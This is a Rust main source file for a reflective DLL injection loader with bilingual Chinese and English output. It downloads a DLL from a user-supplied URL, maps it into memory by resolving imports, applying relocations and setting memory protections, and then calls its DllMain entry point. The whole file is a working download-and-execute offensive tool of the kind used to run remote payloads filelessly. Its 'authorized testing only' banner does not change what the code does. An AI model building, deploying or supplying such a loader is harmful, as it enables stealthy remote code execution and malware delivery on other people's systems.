mod downloader;
mod pe;
mod loader;

use windows::Win32::Foundation::HMODULE;
use std::env;
use std::io::{self, Write};

type DllMain = unsafe extern "system" fn(HMODULE, u32, *mut ()) -> i32;

const DLL_PROCESS_ATTACH: u32 = 1;
const DLL_PROCESS_DETACH: u32 = 0;
const DLL_THREAD_ATTACH: u32 = 2;
const DLL_THREAD_DETACH: u32 = 3;

fn print_banner() {
    println!("=== RDI (Reflective DLL Injection) Loader - Rust Version ===");
    println!("警告：此工具仅应用于授权的安全测试和研究");
    println!("Warning: This tool should only be used for authorized security testing and research");
    println!();
}

fn get_url() -> String {
    let args: Vec<String> = env::args().collect();

    if args.len() > 1 {
        println!("URL from command line: {}", args[1]);
        return args[1].clone();
    }

    print!("请输入远程DLL的URL: ");
    io::stdout().flush().unwrap();

    let mut url = String::new();
    io::stdin().read_line(&mut url).expect("Failed to read URL");
    url.trim().to_string()
}

fn main() {
    print_banner();

    // Get URL
    let url = get_url();

    if url.is_empty() {
        eprintln!("Error: No URL provided!");
        eprintln!("Usage: rust-rdi.exe <url>");
        eprintln!("Example: rust-rdi.exe http://example.com/test.dll");
        return;
    }

    // Download DLL
    println!("\n正在下载DLL...\nDownloading DLL...");
    let dll_data = match downloader::download_dll(&url) {
        Ok(data) => data,
        Err(e) => {
            eprintln!("Failed to download DLL: {}", e);
            return;
        }
    };

    if dll_data.is_empty() {
        eprintln!("Failed to download DLL: empty data");
        return;
    }

    // Validate PE
    println!("\n[*] Starting PE parsing...");
    let parser = pe::PeParser::new(dll_data.clone());
    let _nt_headers = match parser.validate() {
        Ok(headers) => headers,
        Err(e) => {
            eprintln!("PE validation failed: {}", e);
            return;
        }
    };

    // Load DLL into memory
    println!("\n正在加载DLL到内存...\nLoading DLL into memory...");
    let mut loader = unsafe {
        match loader::Loader::load(&dll_data) {
            Ok(l) => l,
            Err(e) => {
                eprintln!("Failed to load DLL: {}", e);
                return;
            }
        }
    };

    println!("DLL加载成功!\nDLL loaded successfully!");

    // Resolve imports
    if let Err(e) = unsafe { loader.resolve_imports() } {
        eprintln!("Failed to resolve imports: {}", e);
        return;
    }

    // Apply relocations
    if let Err(e) = unsafe { loader.apply_relocations() } {
        eprintln!("Failed to apply relocations: {}", e);
        return;
    }

    // Fix memory protections
    if let Err(e) = unsafe { loader.fix_memory_protections() } {
        eprintln!("Failed to fix memory protections: {}", e);
        return;
    }

    // Execute DLL
    println!("\n正在执行DLL...\nExecuting DLL...");
    let entry_point = loader.get_entry_point();
    println!("Entry point: 0x{:X}", entry_point as usize);

    let dll_main: DllMain = unsafe { std::mem::transmute(entry_point) };

    let result = unsafe {
        dll_main(
            HMODULE(loader.base as *mut _),
            DLL_PROCESS_ATTACH,
            std::ptr::null_mut(),
        )
    };

    if result != 0 {
        println!("DLL执行成功!\nDLL executed successfully!");
    } else {
        eprintln!("DLL执行失败\nDLL execution failed");
    }

    println!("\n按Enter键退出...\nPress Enter to exit...");
    let _ = io::stdin().read_line(&mut String::new());

    // Note: We don't free the memory here as the DLL may still be running
    // The OS will clean up when the process exits
}
